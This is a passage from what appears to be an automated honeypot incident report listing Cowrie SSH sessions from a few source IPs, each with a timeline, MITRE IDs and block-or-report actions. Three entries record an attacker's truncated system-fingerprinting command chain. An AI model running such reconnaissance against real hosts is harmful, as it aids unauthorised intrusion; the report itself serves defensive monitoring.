| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 22:41:38` | `cowrie.session.connect` |
| `2026-07-04 22:41:40` | `cowrie.client.version` |
| `2026-07-04 22:41:40` | `cowrie.client.kex` |
| `2026-07-04 22:41:49` | `cowrie.login.success` |
| `2026-07-04 22:41:53` | `cowrie.session.params` |
| `2026-07-04 22:41:53` | `cowrie.command.input` |
| `2026-07-04 22:41:53` | `cowrie.command.input` |
| `2026-07-04 22:41:53` | `cowrie.command.input` |
| `2026-07-04 22:41:53` | `cowrie.command.input` |
| `2026-07-04 22:41:53` | `cowrie.command.input` |
| `2026-07-04 22:41:53` | `cowrie.command.success` |
| `2026-07-04 22:41:53` | `cowrie.command.input` |
| `2026-07-04 22:41:53` | `cowrie.command.input` |
| `2026-07-04 22:41:53` | `cowrie.command.input` |
| `2026-07-04 22:41:53` | `cowrie.command.input` |
| `2026-07-04 22:41:55` | `cowrie.log.closed` |
| `2026-07-04 22:41:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]217` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]217` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-06f1fb8b55e6

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]217` |
| **First Seen** | 2026-07-04 22:43 |
| **Last Seen** | 2026-07-04 22:44 |
| **Session Duration** | 16s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 22:43:43` | `cowrie.session.connect` |
| `2026-07-04 22:43:45` | `cowrie.client.version` |
| `2026-07-04 22:43:45` | `cowrie.client.kex` |
| `2026-07-04 22:43:52` | `cowrie.login.success` |
| `2026-07-04 22:43:56` | `cowrie.session.params` |
| `2026-07-04 22:43:56` | `cowrie.command.input` |
| `2026-07-04 22:43:56` | `cowrie.command.input` |
| `2026-07-04 22:43:56` | `cowrie.command.input` |
| `2026-07-04 22:43:56` | `cowrie.command.input` |
| `2026-07-04 22:43:56` | `cowrie.command.input` |
| `2026-07-04 22:43:56` | `cowrie.command.success` |
| `2026-07-04 22:43:56` | `cowrie.command.input` |
| `2026-07-04 22:43:56` | `cowrie.command.input` |
| `2026-07-04 22:43:56` | `cowrie.command.input` |
| `2026-07-04 22:43:56` | `cowrie.command.input` |
| `2026-07-04 22:43:58` | `cowrie.log.closed` |
| `2026-07-04 22:44:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]217` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]217` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bc76fd23537f

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]217` |
| **First Seen** | 2026-07-04 22:45 |
| **Last Seen** | 2026-07-04 22:45 |
| **Session Duration** | 17s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 22:45:39` | `cowrie.session.connect` |
| `2026-07-04 22:45:41` | `cowrie.client.version` |
| `2026-07-04 22:45:41` | `cowrie.client.kex` |
| `2026-07-04 22:45:48` | `cowrie.login.success` |
| `2026-07-04 22:45:52` | `cowrie.session.params` |
| `2026-07-04 22:45:52` | `cowrie.command.input` |
| `2026-07-04 22:45:52` | `cowrie.command.input` |
| `2026-07-04 22:45:52` | `cowrie.command.input` |
| `2026-07-04 22:45:52` | `cowrie.command.input` |
| `2026-07-04 22:45:52` | `cowrie.command.input` |
| `2026-07-04 22:45:52` | `cowrie.command.success` |
| `2026-07-04 22:45:52` | `cowrie.command.input` |
| `2026-07-04 22:45:52` | `cowrie.command.input` |
| `2026-07-04 22:45:52` | `cowrie.command.input` |
| `2026-07-04 22:45:52` | `cowrie.command.input` |
| `2026-07-04 22:45:54` | `cowrie.log.closed` |
| `2026-07-04 22:45:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]217` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]217` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c243934e1c2b

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-04 22:46 |
| **Last Seen** | 2026-07-04 22:46 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 22:46:34` | `cowrie.session.connect` |
| `2026-07-04 22:46:36` | `cowrie.client.version` |
| `2026-07-04 22:46:36` | `cowrie.client.kex` |
| `2026-07-04 22:46:42` | `cowrie.login.success` |
| `2026-07-04 22:46:46` | `cowrie.session.params` |
| `2026-07-04 22:46:46` | `cowrie.command.input` |
| `2026-07-04 22:46:47` | `cowrie.log.closed` |
| `2026-07-04 22:46:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2ee48d07874f

| Field | Detail |
|---|---|
| **Source IP** | `85.121.177[.]73` |
| **First Seen** | 2026-07-04 22:46 |
| **Last Seen** | 2026-07-04 22:47 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 22:46:59` | `cowrie.session.connect` |
| `2026-07-04 22:46:59` | `cowrie.login.success` |
| `2026-07-04 22:47:00` | `cowrie.session.params` |
| `2026-07-04 22:47:00` | `cowrie.log.closed` |
| `2026-07-04 22:47:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `85.121.177[.]73` to AbuseIPDB if not already reported
- [ ] Block `85.121.177[.]73` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b5fc91611d1f

| Field | Detail |
|---|---|
| **Source IP** | `85.121.177[.]73` |
| **First Seen** | 2026-07-04 22:47 |
| **Last Seen** | 2026-07-04 22:47 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 22:47:01` | `cowrie.session.connect` |
| `2026-07-04 22:47:01` | `cowrie.login.success` |
| `2026-07-04 22:47:02` | `cowrie.session.params` |
| `2026-07-04 22:47:02` | `cowrie.log.closed` |
| `2026-07-04 22:47:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `85.121.177[.]73` to AbuseIPDB if not already reported
- [ ] Block `85.121.177[.]73` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-60bb39707454

| Field | Detail |
|---|---|
| **Source IP** | `85.121.177[.]73` |
| **First Seen** | 2026-07-04 22:47 |
| **Last Seen** | 2026-07-04 22:47 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 22:47:02` | `cowrie.session.connect` |
| `2026-07-04 22:47:02` | `cowrie.login.success` |
| `2026-07-04 22:47:03` | `cowrie.session.params` |
| `2026-07-04 22:47:03` | `cowrie.log.closed` |
| `2026-07-04 22:47:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `85.121.177[.]73` to AbuseIPDB if not already reported
- [ ] Block `85.121.177[.]73` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-106f810fbb63

| Field | Detail |
|---|---|
| **Source IP** | `85.121.177[.]73` |
| **First Seen** | 2026-07-04 22:47 |
| **Last Seen** | 2026-07-04 22:47 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 22:47:03` | `cowrie.session.connect` |
| `2026-07-04 22:47:03` | `cowrie.login.success` |
| `2026-07-04 22:47:04` | `cowrie.session.params` |
| `2026-07-04 22:47:04` | `cowrie.log.closed` |
| `2026-07-04 22:47:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `85.121.177[.]73` to AbuseIPDB if not already reported
- [ ] Block `85.121.177[.]73` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-33b11995adb4

| Field | Detail |
|---|---|
| **Source IP** | `85.121.177[.]73` |
| **First Seen** | 2026-07-04 22:47 |
| **Last Seen** | 2026-07-04 22:47 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 22:47:04` | `cowrie.session.connect` |
| `2026-07-04 22:47:04` | `cowrie.login.success` |
| `2026-07-04 22:47:05` | `cowrie.session.params` |
| `2026-07-04 22:47:05` | `cowrie.log.closed` |
| `2026-07-04 22:47:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `85.121.177[.]73` to AbuseIPDB if not already reported
- [ ] Block `85.121.177[.]73` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8e7d822b6f96

| Field | Detail |
|---|---|
| **Source IP** | `85.121.177[.]73` |
| **First Seen** | 2026-07-04 22:47 |
| **Last Seen** | 2026-07-04 22:47 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 22:47:05` | `cowrie.session.connect` |
| `2026-07-04 22:47:05` | `cowrie.login.success` |
| `2026-07-04 22:47:06` | `cowrie.session.params` |
| `2026-07-04 22:47:06` | `cowrie.log.closed` |
| `2026-07-04 22:47:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `85.121.177[.]73` to AbuseIPDB if not already reported
- [ ] Block `85.121.177[.]73` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-52bdcc99f429

| Field | Detail |
|---|---|
| **Source IP** | `85.121.177[.]73` |
| **First Seen** | 2026-07-04 22:47 |
| **Last Seen** | 2026-07-04 22:47 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 22:47:06` | `cowrie.session.connect` |
| `2026-07-04 22:47:06` | `cowrie.login.success` |
| `2026-07-04 22:47:07` | `cowrie.session.params` |
| `2026-07-04 22:47:07` | `cowrie.log.closed` |
| `2026-07-04 22:47:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `85.121.177[.]73` to AbuseIPDB if not already reported
- [ ] Block `85.121.177[.]73` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b7c8ee4b61dc

| Field | Detail |
|---|---|
| **Source IP** | `85.121.177[.]73` |
| **First Seen** | 2026-07-04 22:47 |
| **Last Seen** | 2026-07-04 22:47 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 22:47:07` | `cowrie.session.connect` |
| `2026-07-04 22:47:07` | `cowrie.login.success` |
| `2026-07-04 22:47:08` | `cowrie.session.params` |
| `2026-07-04 22:47:08` | `cowrie.log.closed` |
| `2026-07-04 22:47:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `85.121.177[.]73` to AbuseIPDB if not already reported
- [ ] Block `85.121.177[.]73` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4d4bc8e5b0c8

| Field | Detail |
|---|---|
| **Source IP** | `85.121.177[.]73` |
| **First Seen** | 2026-07-04 22:47 |
| **Last Seen** | 2026-07-04 22:47 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 22:47:08` | `cowrie.session.connect` |
| `2026-07-04 22:47:08` | `cowrie.login.success` |
| `2026-07-04 22:47:09` | `cowrie.session.params` |
| `2026-07-04 22:47:09` | `cowrie.log.closed` |
| `2026-07-04 22:47:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `85.121.177[.]73` to AbuseIPDB if not already reported
- [ ] Block `85.121.177[.]73` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-676db00fddfa

| Field | Detail |
|---|---|
| **Source IP** | `85.121.177[.]73` |
| **First Seen** | 2026-07-04 22:47 |
| **Last Seen** | 2026-07-04 22:47 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 22:47:09` | `cowrie.session.connect` |
| `2026-07-04 22:47:09` | `cowrie.login.success` |
| `2026-07-04 22:47:10` | `cowrie.session.params` |
| `2026-07-04 22:47:10` | `cowrie.log.closed` |
| `2026-07-04 22:47:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `85.121.177[.]73` to AbuseIPDB if not already reported
- [ ] Block `85.121.177[.]73` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b18f77c25222

| Field | Detail |
|---|---|
| **Source IP** | `85.121.177[.]73` |
| **First Seen** | 2026-07-04 22:47 |
| **Last Seen** | 2026-07-04 22:47 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 22:47:10` | `cowrie.session.connect` |
| `2026-07-04 22:47:10` | `cowrie.login.success` |
| `2026-07-04 22:47:11` | `cowrie.session.params` |
| `2026-07-04 22:47:11` | `cowrie.log.closed` |
| `2026-07-04 22:47:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `85.121.177[.]73` to AbuseIPDB if not already reported
- [ ] Block `85.121.177[.]73` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-69e23ab153fc

| Field | Detail |
|---|---|
| **Source IP** | `85.121.177[.]73` |
| **First Seen** | 2026-07-04 22:47 |
| **Last Seen** | 2026-07-04 22:47 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 22:47:11` | `cowrie.session.connect` |
| `2026-07-04 22:47:11` | `cowrie.login.success` |
| `2026-07-04 22:47:12` | `cowrie.session.params` |
| `2026-07-04 22:47:12` | `cowrie.log.closed` |
| `2026-07-04 22:47:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `85.121.177[.]73` to AbuseIPDB if not already reported
- [ ] Block `85.121.177[.]73` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b00e5b70369a

| Field | Detail |
|---|---|
| **Source IP** | `85.121.177[.]73` |
| **First Seen** | 2026-07-04 22:47 |
| **Last Seen** | 2026-07-04 22:47 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 22:47:12` | `cowrie.session.connect` |
| `2026-07-04 22:47:12` | `cowrie.login.success` |
| `2026-07-04 22:47:13` | `cowrie.session.params` |
| `2026-07-04 22:47:13` | `cowrie.log.closed` |
| `2026-07-04 22:47:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `85.121.177[.]73` to AbuseIPDB if not already reported
- [ ] Block `85.121.177[.]73` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-744cf333f6b8

| Field | Detail |
|---|---|
| **Source IP** | `85.121.177[.]73` |
| **First Seen** | 2026-07-04 22:47 |
| **Last Seen** | 2026-07-04 22:47 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 22:47:13` | `cowrie.session.connect` |
| `2026-07-04 22:47:13` | `cowrie.login.success` |
| `2026-07-04 22:47:14` | `cowrie.session.params` |
| `2026-07-04 22:47:14` | `cowrie.log.closed` |
| `2026-07-04 22:47:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `85.121.177[.]73` to AbuseIPDB if not already reported
- [ ] Block `85.121.177[.]73` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d1959cbb8732

| Field | Detail |
|---|---|
| **Source IP** | `85.121.177[.]73` |
| **First Seen** | 2026-07-04 22:47 |
| **Last Seen** | 2026-07-04 22:47 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 22:47:14` | `cowrie.session.connect` |
| `2026-07-04 22:47:14` | `cowrie.login.success` |
| `2026-07-04 22:47:15` | `cowrie.session.params` |
| `2026-07-04 22:47:15` | `cowrie.log.closed` |
| `2026-07-04 22:47:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `85.121.177[.]73` to AbuseIPDB if not already reported
- [ ] Block `85.121.177[.]73` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-858f78cb63ac

| Field | Detail |
|---|---|
| **Source IP** | `85.121.177[.]73` |
| **First Seen** | 2026-07-04 22:47 |
| **Last Seen** | 2026-07-04 22:47 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 22:47:15` | `cowrie.session.connect` |
| `2026-07-04 22:47:15` | `cowrie.login.success` |
| `2026-07-04 22:47:16` | `cowrie.session.params` |
| `2026-07-04 22:47:16` | `cowrie.log.closed` |
| `2026-07-04 22:47:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `85.121.177[.]73` to AbuseIPDB if not already reported
- [ ] Block `85.121.177[.]73` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-63fa7d2b8516

| Field | Detail |
|---|---|
| **Source IP** | `85.121.177[.]73` |
| **First Seen** | 2026-07-04 22:47 |
| **Last Seen** | 2026-07-04 22:47 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 22:47:16` | `cowrie.session.connect` |
| `2026-07-04 22:47:16` | `cowrie.login.success` |
| `2026-07-04 22:47:17` | `cowrie.session.params` |
| `2026-07-04 22:47:17` | `cowrie.log.closed` |
| `2026-07-04 22:47:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `85.121.177[.]73` to AbuseIPDB if not already reported
- [ ] Block `85.121.177[.]73` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4fd255cfeba0

| Field | Detail |
|---|---|
| **Source IP** | `85.121.177[.]73` |
| **First Seen** | 2026-07-04 22:47 |
| **Last Seen** | 2026-07-04 22:47 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 22:47:17` | `cowrie.session.connect` |
| `2026-07-04 22:47:18` | `cowrie.login.success` |
| `2026-07-04 22:47:18` | `cowrie.session.params` |
| `2026-07-04 22:47:18` | `cowrie.log.closed` |
| `2026-07-04 22:47:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `85.121.177[.]73` to AbuseIPDB if not already reported
- [ ] Block `85.121.177[.]73` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f1f442cbafcf

| Field | Detail |
|---|---|
| **Source IP** | `85.121.177[.]73` |
| **First Seen** | 2026-07-04 22:47 |
| **Last Seen** | 2026-07-04 22:47 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 22:47:18` | `cowrie.session.connect` |
| `2026-07-04 22:47:19` | `cowrie.login.success` |
| `2026-07-04 22:47:19` | `cowrie.session.params` |
| `2026-07-04 22:47:19` | `cowrie.log.closed` |
| `2026-07-04 22:47:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `85.121.177[.]73` to AbuseIPDB if not already reported
- [ ] Block `85.121.177[.]73` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b3a10de71039

| Field | Detail |
|---|---|
| **Source IP** | `85.121.177[.]73` |
| **First Seen** | 2026-07-04 22:47 |
| **Last Seen** | 2026-07-04 22:47 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 22:47:19` | `cowrie.session.connect` |
| `2026-07-04 22:47:20` | `cowrie.login.success` |
| `2026-07-04 22:47:20` | `cowrie.session.params` |
| `2026-07-04 22:47:20` | `cowrie.log.closed` |
| `2026-07-04 22:47:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `85.121.177[.]73` to AbuseIPDB if not already reported
- [ ] Block `85.121.177[.]73` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-afcda252fa00

| Field | Detail |
|---|---|
| **Source IP** | `85.121.177[.]73` |
| **First Seen** | 2026-07-04 22:47 |
| **Last Seen** | 2026-07-04 22:47 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 22:47:20` | `cowrie.session.connect` |
| `2026-07-04 22:47:21` | `cowrie.login.success` |
| `2026-07-04 22:47:21` | `cowrie.session.params` |
| `2026-07-04 22:47:21` | `cowrie.log.closed` |
| `2026-07-04 22:47:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `85.121.177[.]73` to AbuseIPDB if not already reported
- [ ] Block `85.121.177[.]73` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8a6d3c0e5224

| Field | Detail |
|---|---|
| **Source IP** | `85.121.177[.]73` |
| **First Seen** | 2026-07-04 22:47 |
| **Last Seen** | 2026-07-04 22:47 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 22:47:21` | `cowrie.session.connect` |
| `2026-07-04 22:47:22` | `cowrie.login.success` |
| `2026-07-04 22:47:22` | `cowrie.session.params` |
| `2026-07-04 22:47:22` | `cowrie.log.closed` |
| `2026-07-04 22:47:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `85.121.177[.]73` to AbuseIPDB if not already reported
- [ ] Block `85.121.177[.]73` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3cf4c0846dc3

| Field | Detail |
|---|---|
| **Source IP** | `85.121.177[.]73` |
| **First Seen** | 2026-07-04 22:47 |
| **Last Seen** | 2026-07-04 22:47 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 22:47:22` | `cowrie.session.connect` |
| `2026-07-04 22:47:23` | `cowrie.login.success` |
| `2026-07-04 22:47:23` | `cowrie.session.params` |
| `2026-07-04 22:47:23` | `cowrie.log.closed` |
| `2026-07-04 22:47:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `85.121.177[.]73` to AbuseIPDB if not already reported
- [ ] Block `85.121.177[.]73` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-82eac06da537

| Field | Detail |
|---|---|
| **Source IP** | `85.121.177[.]73` |
| **First Seen** | 2026-07-04 22:47 |
| **Last Seen** | 2026-07-04 22:47 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 22:47:23` | `cowrie.session.connect` |
| `2026-07-04 22:47:24` | `cowrie.login.success` |
| `2026-07-04 22:47:24` | `cowrie.session.params` |
| `2026-07-04 22:47:24` | `cowrie.log.closed` |
| `2026-07-04 22:47:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `85.121.177[.]73` to AbuseIPDB if not already reported
- [ ] Block `85.121.177[.]73` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fcb41bc6c885

| Field | Detail |
|---|---|
| **Source IP** | `85.121.177[.]73` |
| **First Seen** | 2026-07-04 22:47 |
| **Last Seen** | 2026-07-04 22:47 |
| **Session Duration** | 1s |
